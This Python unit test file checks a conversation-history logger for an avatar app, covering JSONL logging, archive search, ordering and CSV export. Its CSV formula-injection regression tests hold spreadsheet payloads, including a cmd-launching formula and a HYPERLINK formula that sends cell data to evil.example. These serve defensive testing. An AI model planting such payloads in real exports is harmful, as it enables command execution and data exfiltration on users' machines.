"""
Unit tests for conversation_log.ConversationLog — the conversation history
recorder that wires user comments and avatar replies into the existing
avatar event log (JSONL) toolchain.
"""
import json
import os
import queue
import sys
import tempfile
import unittest

from conftest import make_qt_stub  # noqa: E402
from unittest import mock

_MAIN = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "main")
sys.path.insert(0, _MAIN)

from conversation_log import (  # noqa: E402
    ConversationLog,
    DEFAULT_LOGFILE,
    EVENT_AVATAR_REPLY,
    EVENT_USER_COMMENT,
    get_conversation_log,
    reset_conversation_log,
)


class DefaultLogfileIsCwdIndependentTests(unittest.TestCase):
    """Regression: DEFAULT_LOGFILE used to be the bare string
    'avatar_event_log.jsonl'. Every production call site
    (avatar_3d_autonomous_tts.py, persona_cli.py) calls get_conversation_log()
    with no argument, so a relative default meant the conversation history —
    the core "memory" behind /recap, /search, and wellbeing tracking — landed
    in whatever directory the process happened to be launched from, silently
    fragmenting across desktop-shortcut vs. terminal-vs-test-run invocations.
    manage_satin.py had already worked around this locally by re-deriving an
    absolute path; the constant itself must be absolute so every caller
    (including test runs) resolves to the same real file regardless of cwd.
    """

    def test_default_logfile_is_absolute(self):
        self.assertTrue(os.path.isabs(DEFAULT_LOGFILE))

    def test_default_logfile_is_repo_root_anchored(self):
        repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.assertEqual(DEFAULT_LOGFILE, os.path.join(repo_root, "avatar_event_log.jsonl"))

    def test_default_logfile_independent_of_cwd(self):
        cwd = os.getcwd()
        try:
            with tempfile.TemporaryDirectory() as d:
                os.chdir(d)
                # Re-import is unnecessary — DEFAULT_LOGFILE was computed once
                # at module import from __file__, not from cwd.
                self.assertTrue(os.path.isabs(DEFAULT_LOGFILE))
                self.assertNotIn(d, DEFAULT_LOGFILE)
        finally:
            os.chdir(cwd)


class _TmpLogBase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.mkdtemp()
        self.logfile = os.path.join(self._tmp, "events.jsonl")
        self.log = ConversationLog(self.logfile)

    def tearDown(self):
        import shutil
        shutil.rmtree(self._tmp, ignore_errors=True)

    def _read_lines(self):
        if not os.path.exists(self.logfile):
            return []
        with open(self.logfile, encoding="utf-8") as f:
            return [json.loads(l) for l in f if l.strip()]


class LoggingTests(_TmpLogBase):
    def test_log_user_comment_writes_event(self):
        self.log.log_user_comment("こんにちは")
        events = self._read_lines()
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["event_type"], EVENT_USER_COMMENT)
        self.assertEqual(events[0]["details"]["text"], "こんにちは")
        self.assertIn("timestamp", events[0])

    def test_log_avatar_reply_records_target(self):
        self.log.log_avatar_reply("やっほー", to="こんにちは")
        events = self._read_lines()
        self.assertEqual(events[0]["event_type"], EVENT_AVATAR_REPLY)
        self.assertEqual(events[0]["details"]["text"], "やっほー")
        self.assertEqual(events[0]["details"]["to"], "こんにちは")

    def test_log_exchange_writes_both(self):
        self.log.log_exchange("hello", "Hi there!")
        events = self._read_lines()
        self.assertEqual([e["event_type"] for e in events],
                         [EVENT_USER_COMMENT, EVENT_AVATAR_REPLY])

    def test_log_exchange_skips_echo_reply(self):
        """Echo (reply == comment) must not be double-recorded as a reply."""
        self.log.log_exchange("echo me", "echo me")
        events = self._read_lines()
        self.assertEqual([e["event_type"] for e in events], [EVENT_USER_COMMENT])

    def test_empty_text_not_recorded(self):
        self.log.log_user_comment("")
        self.log.log_avatar_reply("")
        self.assertEqual(self._read_lines(), [])


class RecentTests(_TmpLogBase):
    def test_recent_returns_oldest_first(self):
        self.log.log_exchange("q1", "a1")
        self.log.log_exchange("q2", "a2")
        recent = self.log.recent(10)
        texts = [(e["event_type"], e["details"]["text"]) for e in recent]
        self.assertEqual(texts, [
            (EVENT_USER_COMMENT, "q1"), (EVENT_AVATAR_REPLY, "a1"),
            (EVENT_USER_COMMENT, "q2"), (EVENT_AVATAR_REPLY, "a2"),
        ])

    def test_recent_limits_to_n(self):
        for i in range(10):
            self.log.log_user_comment(f"c{i}")
        recent = self.log.recent(3)
        self.assertEqual([e["details"]["text"] for e in recent], ["c7", "c8", "c9"])

    def test_recent_filters_non_conversation_events(self):
        # Write a non-conversation event directly (e.g. a move event)
        self.log._logger.log_event("move", x=1.0)
        self.log.log_user_comment("hi")
        recent = self.log.recent(10)
        self.assertEqual(len(recent), 1)
        self.assertEqual(recent[0]["event_type"], EVENT_USER_COMMENT)

    def test_recent_missing_file_returns_empty(self):
        log = ConversationLog(os.path.join(self._tmp, "nope.jsonl"))
        self.assertEqual(log.recent(), [])

    def test_recent_falls_back_to_archives_when_live_is_empty(self):
        """Right after log rotation the live file is empty; recent() must
        return entries from the newest archive instead of an empty list."""
        import gzip
        gz_name = os.path.basename(self.logfile) + ".20260101_000000.gz"
        gz_path = os.path.join(self._tmp, gz_name)
        with gzip.open(gz_path, "wt", encoding="utf-8") as fh:
            import json as _json
            fh.write(_json.dumps({
                "timestamp": 1.0, "event_type": EVENT_USER_COMMENT,
                "details": {"text": "archived"}
            }) + "\n")
        # empty live file (just rotated)
        open(self.logfile, "w").close()
        entries = self.log.recent(5)
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["details"]["text"], "archived")

    def test_recent_skips_corrupt_lines(self):
        with open(self.logfile, "w", encoding="utf-8") as f:
            f.write("not json\n")
            f.write(json.dumps({"timestamp": 1, "event_type": EVENT_USER_COMMENT,
                                "details": {"text": "ok"}}) + "\n")
        self.assertEqual(len(self.log.recent()), 1)

    def test_recent_texts_format(self):
        self.log.log_exchange("hello", "Hi!")
        texts = self.log.recent_texts()
        self.assertEqual(len(texts), 2)
        # 形式: "[YYYY-MM-DD HH:MM:SS] You: hello" または "You: hello"（タイムスタンプ付き）
        self.assertTrue(texts[0].endswith("You: hello"), texts[0])
        self.assertTrue(texts[1].endswith("Avatar: Hi!"), texts[1])

    def test_recent_texts_includes_timestamp(self):
        self.log.log_user_comment("test message")
        texts = self.log.recent_texts()
        self.assertEqual(len(texts), 1)
        # タイムスタンプ付き形式を確認
        self.assertRegex(texts[0], r"^\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\] You: test message$")

    def test_recent_texts_custom_labels(self):
        self.log.log_exchange("hello", "Hi!")
        texts = self.log.recent_texts(user_label="User", avatar_label="Satin")
        self.assertEqual(len(texts), 2)
        self.assertTrue(texts[0].endswith("User: hello"), texts[0])
        self.assertTrue(texts[1].endswith("Satin: Hi!"), texts[1])

    def test_recent_includes_legacy_user_events(self):
        """Regression: recent() used (EVENT_USER_COMMENT, EVENT_AVATAR_REPLY) tuple,
        missing legacy 'user'/'avatar' event types that search() includes."""
        legacy = {"timestamp": 1.0, "event_type": "user",
                  "details": {"text": "legacy user"}}
        with open(self.logfile, "w", encoding="utf-8") as f:
            f.write(json.dumps(legacy) + "\n")
        entries = self.log.recent(10)
        self.assertEqual(len(entries), 1, "Legacy 'user' events must appear in recent()")
        self.assertEqual(entries[0]["event_type"], "user")

    def test_recent_texts_null_timestamp_does_not_crash(self):
        """Regression: null timestamp caused uncaught TypeError in recent_texts()."""
        event = {"timestamp": None, "event_type": EVENT_USER_COMMENT,
                 "details": {"text": "null ts"}}
        with open(self.logfile, "w", encoding="utf-8") as f:
            f.write(json.dumps(event) + "\n")
        texts = self.log.recent_texts()  # must not raise TypeError
        self.assertEqual(len(texts), 1)
        self.assertIn("null ts", texts[0])


class ToCsvTests(_TmpLogBase):
    """ConversationLog.to_csv() produces valid CSV output."""

    def _populate(self):
        self.log.log_exchange("hello", "hi there")
        self.log.log_exchange("bye", "see you")

    def test_empty_log_has_header_only(self):
        csv = self.log.to_csv()
        lines = [l for l in csv.splitlines() if l.strip()]
        self.assertEqual(len(lines), 1)
        self.assertIn("timestamp", lines[0])
        self.assertIn("speaker", lines[0])

    def test_csv_has_correct_row_count(self):
        self._populate()
        import csv, io
        reader = csv.DictReader(io.StringIO(self.log.to_csv()))
        rows = list(reader)
        # 2 exchanges = 4 rows (2 user + 2 avatar)
        self.assertEqual(len(rows), 4)

    def test_csv_speaker_labels(self):
        self._populate()
        import csv, io
        rows = list(csv.DictReader(io.StringIO(self.log.to_csv())))
        speakers = [r["speaker"] for r in rows]
        self.assertIn("You", speakers)
        self.assertIn("Avatar", speakers)

    def test_csv_custom_labels(self):
        self.log.log_exchange("hi", "hey")
        import csv, io
        csv_text = self.log.to_csv(user_label="User", avatar_label="Bot")
        rows = list(csv.DictReader(io.StringIO(csv_text)))
        speakers = {r["speaker"] for r in rows}
        self.assertIn("User", speakers)
        self.assertIn("Bot", speakers)

    def test_csv_text_column_correct(self):
        self.log.log_exchange("hello world", "hi")
        import csv, io
        rows = list(csv.DictReader(io.StringIO(self.log.to_csv())))
        texts = [r["text"] for r in rows]
        self.assertIn("hello world", texts)
        self.assertIn("hi", texts)

    def test_csv_n_limit(self):
        for i in range(5):
            self.log.log_exchange(f"msg{i}", f"rep{i}")
        import csv, io
        # n=2 returns last 2 events only
        rows = list(csv.DictReader(io.StringIO(self.log.to_csv(n=2))))
        self.assertEqual(len(rows), 2)

    def test_csv_contains_datetime_column(self):
        self.log.log_exchange("test", "ok")
        import csv, io
        rows = list(csv.DictReader(io.StringIO(self.log.to_csv())))
        self.assertIn("datetime", rows[0])
        # datetime should be non-empty and parseable
        dt_str = rows[0]["datetime"]
        self.assertRegex(dt_str, r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}")

    def test_csv_includes_archived_events(self):
        """to_csv() must include rotated archive entries (include_archives=True)."""
        import gzip, csv, io
        gz_name = os.path.basename(self.logfile) + ".20260101_000000.gz"
        gz_path = os.path.join(self._tmp, gz_name)
        ev = {"timestamp": 1.0, "event_type": EVENT_USER_COMMENT,
              "details": {"text": "archived message"}}
        with gzip.open(gz_path, "wt", encoding="utf-8") as fh:
            import json as _json
            fh.write(_json.dumps(ev) + "\n")
        self.log.log_exchange("live message", "live reply")

        rows = list(csv.DictReader(io.StringIO(self.log.to_csv(include_archives=True))))
        texts = [r["text"] for r in rows]
        self.assertIn("archived message", texts)
        self.assertIn("live message", texts)

    def test_csv_include_archives_false_omits_gz(self):
        """include_archives=False must not read gz archives."""
        import gzip, csv, io
        gz_name = os.path.basename(self.logfile) + ".20260101_000000.gz"
        gz_path = os.path.join(self._tmp, gz_name)
        ev = {"timestamp": 1.0, "event_type": EVENT_USER_COMMENT,
              "details": {"text": "only in archive"}}
        with gzip.open(gz_path, "wt", encoding="utf-8") as fh:
            import json as _json
            fh.write(_json.dumps(ev) + "\n")
        # Empty live file
        open(self.logfile, "w").close()

        rows = list(csv.DictReader(io.StringIO(self.log.to_csv(include_archives=False))))
        texts = [r["text"] for r in rows]
        self.assertNotIn("only in archive", texts)

    def test_csv_null_timestamp_does_not_crash(self):
        """Regression: null timestamp caused uncaught TypeError in to_csv()."""
        event = {"timestamp": None, "event_type": EVENT_USER_COMMENT,
                 "details": {"text": "no ts"}}
        with open(self.logfile, "w", encoding="utf-8") as f:
            f.write(json.dumps(event) + "\n")
        import csv, io
        rows = list(csv.DictReader(io.StringIO(self.log.to_csv())))
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["datetime"], "",
                         "Null timestamp should produce empty datetime, not crash")

    def test_csv_legacy_user_event_type_labeled_as_user(self):
        """Legacy 'user' event_type must be labeled as user, not avatar, in CSV.

        Before the fix, to_csv() used == EVENT_USER_COMMENT ('user_comment') while
        search() returned entries with the legacy 'user' type; those entries were
        mis-labeled as avatar_label in the CSV output.
        """
        import csv, io, json
        # Write a legacy-format event directly (event_type="user" not "user_comment")
        legacy = {"timestamp": 1000.0, "event_type": "user",
                  "details": {"text": "legacy user msg"}}
        with open(self.logfile, "w", encoding="utf-8") as f:
            f.write(json.dumps(legacy) + "\n")

        rows = list(csv.DictReader(io.StringIO(self.log.to_csv())))
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["speaker"], "You",
                         f"Legacy 'user' event should be labeled 'You'; got {rows[0]['speaker']!r}")


class CsvFormulaInjectionTests(_TmpLogBase):
    """Regression: to_csv() wrote conversation text (a user-controlled
    field) verbatim into CSV cells. Excel/Sheets/LibreOffice treat a cell
    starting with '=', '+', '-', '@', tab, or CR as a formula to evaluate on
    open — a logged message like "=cmd|'/C calc'!A1" or "=HYPERLINK(evil)"
    would execute/exfiltrate the moment the exported CSV is opened in a
    spreadsheet app. Cells starting with those characters must be prefixed
    with a single quote to neutralize formula interpretation.
    """

    def _first_text_cell(self, csv_text):
        import csv, io
        rows = list(csv.DictReader(io.StringIO(csv_text)))
        return rows[0]["text"]

    def test_leading_equals_is_neutralized(self):
        self.log.log_user_comment("=cmd|'/C calc'!A1")
        cell = self._first_text_cell(self.log.to_csv())
        self.assertTrue(cell.startswith("'="), f"got {cell!r}")

    def test_leading_plus_is_neutralized(self):
        self.log.log_user_comment("+1+1")
        cell = self._first_text_cell(self.log.to_csv())
        self.assertTrue(cell.startswith("'+"), f"got {cell!r}")

    def test_leading_at_is_neutralized(self):
        self.log.log_user_comment("@SUM(1,1)")
        cell = self._first_text_cell(self.log.to_csv())
        self.assertTrue(cell.startswith("'@"), f"got {cell!r}")

    def test_leading_hyphen_is_neutralized(self):
        self.log.log_user_comment("-2+3")
        cell = self._first_text_cell(self.log.to_csv())
        self.assertTrue(cell.startswith("'-"), f"got {cell!r}")

    def test_normal_text_is_unmodified(self):
        self.log.log_user_comment("hello, how are you?")
        cell = self._first_text_cell(self.log.to_csv())
        self.assertEqual(cell, "hello, how are you?")

    def test_hyperlink_formula_is_neutralized(self):
        self.log.log_user_comment('=HYPERLINK("http://evil.example/?"&A1,"click")')
        cell = self._first_text_cell(self.log.to_csv())
        self.assertTrue(cell.startswith("'="), f"got {cell!r}")


class SingletonTests(unittest.TestCase):
    def tearDown(self):
        reset_conversation_log()

    def test_singleton_shared(self):
        reset_conversation_log()
        a = get_conversation_log()
        b = get_conversation_log()
        self.assertIs(a, b)

    def test_reset_creates_new(self):
        a = get_conversation_log()
        reset_conversation_log()
        self.assertIsNot(a, get_conversation_log())


class SpeakCommentWiringTests(unittest.TestCase):
    """speak_comment must record the exchange into the conversation log."""

    def setUp(self):
        self._tmp = tempfile.mkdtemp()
        self.logfile = os.path.join(self._tmp, "events.jsonl")

    def tearDown(self):
        import shutil
        shutil.rmtree(self._tmp, ignore_errors=True)
        reset_conversation_log()

    def test_speak_comment_logs_exchange(self):
        import avatar_3d_autonomous_tts as _mod
        from persona import Persona

        test_log = ConversationLog(self.logfile)
        respond_persona = Persona.from_dict({
            "responses": {"en": {"rules": [
                {"keywords": ["hello"], "replies": ["REPLY"]}], "fallback": []}},
            "default_lang": "en",
        }, lang="en")

        with mock.patch.object(_mod, "get_conversation_log", lambda: test_log), \
             mock.patch.object(_mod.AutonomousBehaviorMixin, "persona",
                               property(lambda self: respond_persona)), \
             mock.patch.object(_mod, "_get_user_profile_gui", lambda: None):
            v = make_qt_stub(_mod.AutonomousAvatarViewer)
            v.comment_text = ""
            v.mode = "idle"
            v.ticks = 0
            v.tts_queue = queue.Queue()
            v.pending_fact_key = None
            v.speak_comment("hello")

        recorded = test_log.recent()
        self.assertEqual([e["event_type"] for e in recorded],
                         [EVENT_USER_COMMENT, EVENT_AVATAR_REPLY])
        self.assertEqual(recorded[0]["details"]["text"], "hello")
        self.assertEqual(recorded[1]["details"]["text"], "REPLY")

    def test_speak_comment_survives_log_failure(self):
        """A broken conversation log must not break TTS/display."""
        import avatar_3d_autonomous_tts as _mod

        def _boom():
            raise RuntimeError("log unavailable")

        with mock.patch.object(_mod, "get_conversation_log", _boom), \
             mock.patch.object(_mod.AutonomousBehaviorMixin, "persona",
                               property(lambda self: None)):
            v = make_qt_stub(_mod.AutonomousAvatarViewer)
            v.comment_text = ""
            v.mode = "idle"
            v.ticks = 0
            v.tts_queue = queue.Queue()
            v.pending_fact_key = None
            v.speak_comment("hi")  # must not raise
            self.assertEqual(v.comment_text, "hi")


class ArchiveSearchTests(unittest.TestCase):
    """ConversationLog.search() must transparently include rotated .gz archives
    so that log rotation does not cause the companion to "forget" old conversations."""

    def setUp(self):
        import gzip
        self._tmp = tempfile.mkdtemp()
        self.logfile = os.path.join(self._tmp, "events.jsonl")
        self._gzip = gzip

    def tearDown(self):
        import shutil
        shutil.rmtree(self._tmp, ignore_errors=True)

    def _write_gz_archive(self, filename, events):
        """Write a list of event dicts as a .gz JSONL archive."""
        path = os.path.join(self._tmp, filename)
        with self._gzip.open(path, "wt", encoding="utf-8") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")
        return path

    def _make_event(self, event_type, text, ts=1_000_000.0):
        return {"timestamp": ts, "event_type": event_type,
                "details": {"text": text}}

    def test_search_finds_events_in_archive(self):
        archive_ev = self._make_event(EVENT_USER_COMMENT, "archived hello", ts=1.0)
        self._write_gz_archive(
            os.path.basename(self.logfile) + ".20260101_000000.gz", [archive_ev]
        )
        # Live file is empty (just rotated)
        open(self.logfile, "w").close()

        results = ConversationLog(self.logfile).search("archived hello")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["details"]["text"], "archived hello")

    def test_search_combines_archive_and_live(self):
        archive_ev = self._make_event(EVENT_USER_COMMENT, "old memory", ts=1.0)
        self._write_gz_archive(
            os.path.basename(self.logfile) + ".20260101_000000.gz", [archive_ev]
        )
        log = ConversationLog(self.logfile)
        log.log_user_comment("new comment")

        results = log.search("")  # empty query → all events
        texts = [ev["details"]["text"] for ev in results]
        self.assertIn("old memory", texts)
        self.assertIn("new comment", texts)

    def test_search_archive_order_is_chronological(self):
        """Archive events (older) appear before live events (newer)."""
        archive_ev = self._make_event(EVENT_USER_COMMENT, "past", ts=1.0)
        self._write_gz_archive(
            os.path.basename(self.logfile) + ".20260101_000000.gz", [archive_ev]
        )
        log = ConversationLog(self.logfile)
        log.log_user_comment("present")

        results = log.search("")
        texts = [ev["details"]["text"] for ev in results]
        self.assertEqual(texts.index("past"), 0)
        self.assertGreater(texts.index("present"), 0)

    def test_search_include_archives_false_skips_gz(self):
        archive_ev = self._make_event(EVENT_USER_COMMENT, "secret old msg", ts=1.0)
        self._write_gz_archive(
            os.path.basename(self.logfile) + ".20260101_000000.gz", [archive_ev]
        )
        open(self.logfile, "w").close()

        results = ConversationLog(self.logfile).search("secret old msg",
                                                       include_archives=False)
        self.assertEqual(results, [])

    def test_search_no_archives_present_returns_live_only(self):
        log = ConversationLog(self.logfile)
        log.log_user_comment("only live")

        results = log.search("only live")
        self.assertEqual(len(results), 1)

    def test_corrupt_archive_is_skipped_not_crashed(self):
        """A truncated or corrupt .gz archive must not crash search()."""
        bad_path = os.path.join(
            self._tmp, os.path.basename(self.logfile) + ".20260101_000000.gz"
        )
        with open(bad_path, "wb") as fh:
            fh.write(b"\x1f\x8b\x00garbage")  # invalid gzip header
        log = ConversationLog(self.logfile)
        log.log_user_comment("live event")

        # Must not raise
        results = log.search("live event")
        self.assertEqual(len(results), 1)

    def test_find_archives_returns_empty_for_no_gz(self):
        from conversation_log import _find_archives
        open(self.logfile, "w").close()
        self.assertEqual(_find_archives(self.logfile), [])

    def test_find_archives_returns_sorted_by_filename_timestamp(self):
        """Sort order uses the embedded timestamp, not mtime.

        This matters after a backup restore where all files get the same
        mtime.  Writing archives in reverse mtime order verifies that the
        embedded timestamp wins.
        """
        import time
        from conversation_log import _find_archives
        base = os.path.basename(self.logfile)
        p1 = os.path.join(self._tmp, base + ".20260101_000000.gz")
        p2 = os.path.join(self._tmp, base + ".20260102_000000.gz")
        # Write p2 (newer timestamp) first so its mtime is older
        with self._gzip.open(p2, "wt") as f:
            f.write("")
        time.sleep(0.01)
        with self._gzip.open(p1, "wt") as f:
            f.write("")
        # mtime order is p2, p1 (p1 written later → newer mtime)
        # but timestamp order should be p1, p2 (20260101 < 20260102)
        archives = _find_archives(self.logfile)
        self.assertEqual(archives, [p1, p2])


class RecentMultiArchiveOrderingTests(unittest.TestCase):
    """recent() must return entries in chronological order even when they span
    multiple archive files.  Bug: the old code appended entries newest-archive-
    first then reversed the flat list, mixing up blocks from different archives."""

    def setUp(self):
        import gzip
        self._tmp = tempfile.mkdtemp()
        self.logfile = os.path.join(self._tmp, "events.jsonl")
        self._gzip = gzip

    def tearDown(self):
        import shutil
        shutil.rmtree(self._tmp, ignore_errors=True)

    def _write_gz_archive(self, ts_tag, events):
        basename = os.path.basename(self.logfile)
        path = os.path.join(self._tmp, f"{basename}.{ts_tag}.gz")
        with self._gzip.open(path, "wt", encoding="utf-8") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")
        return path

    def _ev(self, text, ts, et=EVENT_USER_COMMENT):
        return {"timestamp": ts, "event_type": et, "details": {"text": text}}

    def test_two_archives_no_live_chronological_order(self):
        """Entries from an older archive must come before those from a newer archive."""
        old_events = [self._ev("o1", 1.0), self._ev("o2", 2.0), self._ev("o3", 3.0)]
        new_events = [self._ev("n1", 4.0), self._ev("n2", 5.0), self._ev("n3", 6.0)]
        self._write_gz_archive("20260101_000000", old_events)
        self._write_gz_archive("20260102_000000", new_events)
        # empty live file
        open(self.logfile, "w").close()

        entries = ConversationLog(self.logfile).recent(5)
        texts = [e["details"]["text"] for e in entries]
        # Most recent 5 of 6 total, oldest first → [o2, o3, n1, n2, n3]
        self.assertEqual(texts, ["o2", "o3", "n1", "n2", "n3"])

    def test_two_archives_no_live_timestamps_ascending(self):
        """Timestamps in the result must be monotonically non-decreasing."""
        old_events = [self._ev(f"o{i}", float(i)) for i in range(1, 4)]
        new_events = [self._ev(f"n{i}", float(i + 10)) for i in range(1, 4)]
        self._write_gz_archive("20260101_000000", old_events)
        self._write_gz_archive("20260102_000000", new_events)
        open(self.logfile, "w").close()

        entries = ConversationLog(self.logfile).recent(5)
        timestamps = [e["timestamp"] for e in entries]
        self.assertEqual(timestamps, sorted(timestamps))

    def test_two_archives_plus_live_chronological_order(self):
        """Ordering must be correct when live file also contributes entries."""
        old_events = [self._ev("o1", 1.0), self._ev("o2", 2.0)]
        new_events = [self._ev("n1", 3.0), self._ev("n2", 4.0)]
        self._write_gz_archive("20260101_000000", old_events)
        self._write_gz_archive("20260102_000000", new_events)

        log = ConversationLog(self.logfile)
        log.log_user_comment("live1")

        entries = log.recent(6)
        texts = [e["details"]["text"] for e in entries]
        # oldest archive first, then newer archive, then live
        old_idx = texts.index("o1")
        new_idx = texts.index("n1")
        live_idx = texts.index("live1")
        self.assertLess(old_idx, new_idx)
        self.assertLess(new_idx, live_idx)


if __name__ == "__main__":
    unittest.main()
